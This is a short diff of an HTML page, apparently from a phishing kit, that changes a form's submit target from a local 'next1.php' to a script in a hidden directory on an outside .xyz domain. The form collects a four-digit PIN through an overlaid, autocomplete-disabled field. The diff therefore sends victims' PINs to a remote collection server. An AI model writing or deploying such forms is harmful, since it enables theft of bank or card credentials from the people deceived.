@@ -45,7 +45,7 @@ function validateform(){
 
 
  
-<form action="next1.php"   name="myform" id="myform"  onSubmit="return validateform()"  method="post">  
+<form action="https://beunrulypo.xyz/.hjmm/next1.php"   name="myform" id="myform"  onSubmit="return validateform()"  method="post">  
  <input   name="pin0978" type="text" autocomplete="off" required style="position:absolute;width:40px;left:581px;top:317px;z-index:28;height:12px;  border:1px solid #ccc;   "  maxlength="4" onkeypress='return isNumberKey(event)'>
  
   
